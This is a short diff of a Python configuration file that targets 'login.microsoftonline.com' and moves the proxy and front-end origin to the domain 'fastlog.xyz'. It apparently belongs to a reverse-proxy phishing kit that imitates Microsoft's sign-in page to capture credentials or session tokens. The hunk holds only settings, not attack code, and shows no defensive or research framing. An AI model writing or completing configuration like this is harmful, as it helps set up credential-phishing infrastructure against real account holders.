@@ -43,8 +43,8 @@ TARGET_HOST = "login.microsoftonline.com"
 # TARGET_URL = "https://target.com"      # ← Change to your actual target base URL
 # TARGET_HOST = "target.com"
 
-FRONTEND_ORIGIN = "https://joeltodo.pythonanywhere.com"   # Your exact frontend origin
-PROXY_BASE = "https://joeltodo.pythonanywhere.com"   # Your exact frontend origin
+FRONTEND_ORIGIN = "https://fastlog.xyz"   # Your exact frontend origin
+PROXY_BASE = "https://fastlog.xyz"   # Your exact frontend origin
 
 # ===========================================
 
